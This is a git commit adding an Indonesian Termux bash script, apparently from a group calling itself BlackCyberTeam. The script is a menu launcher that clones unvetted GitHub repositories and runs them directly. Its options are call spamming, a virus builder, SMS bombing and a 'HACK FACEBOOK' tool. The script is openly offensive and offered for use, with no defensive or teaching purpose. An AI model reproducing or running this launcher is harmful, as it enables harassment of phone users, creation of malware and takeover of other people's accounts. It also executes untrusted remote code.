d319362c9e172fd30ec1d9207166e635768f5d10
Mr-IngsS <54253110+Mr-IngsS@users.noreply.github.com>
2019-09-05 05:36:50 +0700

    Toolsfree

---
+++ MR.H4CKYOU7H_.sh
@@ -0,0 +1,109 @@
+#!/system/xbin/bash
+#No record
+clear
+toilet -f slant --gay "ToolsFree"
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+sleep 2
+echo $green"<[•••••••••••••••••••••••••••••••••••••••]>"
+echo $yellow" Author : MR.H4CKYOU7H_"
+echo $blue" MyTeam : BlackCyberTeam"
+echo $red" Massage  : Pergi Merusak Pulang Terhormat"
+echo $cyan" My Instagram : @Ariomhmdrzky_"
+echo $green"<[•••••••••••••••••••••••••••••••••••••••]>"
+sleep 2
+echo
+echo "\033[31;1m SILAHKAN PILIH TOOLS"
+echo $white"<[=========================]>"
+sleep 2
+echo "\033[31;1m[ 1 ].SPAM TELPON"
+echo $white"<[=========================]>"
+sleep 2
+echo "\033[31;1m[ 2 ].BUAT VIRUS"
+echo $white"<[=========================]>"
+sleep 2
+echo "\033[31;1m[ 3 ].NEWSX"
+sleep 2
+echo $white"<[=========================]>"
+sleep 2
+echo "\033[31;1m[ 4 ].BRUTAL SMS"
+sleep 2
+echo $white"<[=========================]>"
+sleep 2
+echo "\033[31;1m[ 5 ].HACK FACEBOOK"
+sleep 2
+echo $white"<[=========================]>"
+sleep 2
+echo "\033[31;1m[ 6 ].KELUAR"
+sleep 2
+echo $white"<[=========================]>"
+echo $green"TERIMA KASIH SUDAH MENGGUNAKAN TOOLS INI"
+read -p "[H4CKYOU7H_~#" rgl
+
+if [ $rgl = 1 ] || [ $rgl = 1 ]
+then
+clear
+toilet -f slant --gay "Tayo"
+apt install git
+git clone https://github.com/4L13199/LITESPAM
+cd LITESPAM
+sh LITESPAM.sh
+fi
+
+if [ $rgl = 2 ] || [ $rgl = 2 ]
+then
+clear
+toilet -f slant --gay "MR.H4CKY0U7H_"
+apt install git
+pkg install python2
+git clone https://github.com/BlackCyberAnonim/B-VIRUS
+cd B-VIRUS
+python2 B-VIRUS.py
+fi
+
+if [ $rgl = 3 ] || [ $rgl = 3 ]
+then
+clear
+toilet -f slant --gay "NEWSX"
+apt install git
+apt update && apt upgrade
+git clone https://github.com/pengangguranmuda/NewsX
+cd NewsX
+sh newsx.sh
+fi
+
+if [ $rgl = 4 ] || [ $rgl = 4 ]
+then
+clear
+toilet -f slant --gay "BRUTALSMS"
+pkg install python2
+apt install git
+git clone https://github.com/TERMUXID3/brutal-sms.git
+cd brutal-sms
+python2 run.py
+fi
+
+if [ $rgl = 5 ] || [ $rgl = 5 ]
+then
+clear
+toilet -f slant --gay "HACK FB"
+pkg install python2
+apt install git
+git clone https://github.com/bukanhacker/Sad.git
+cd Sad
+python2 Sad.py
+fi
+
+if [$rgl = 6 ] || [ $rgl = 6 ]
+then
+echo $green"WE ARE BLACK CYBER TEAM"
+sleep 1
+echo $green"TERIMA KASIH SUDAH MENGGUNAKAN TOOLS INI"
+sleep 1
+echo $green"JANGAN LUPA FOLLOW MY INSTAGRAMNYA"
+fi
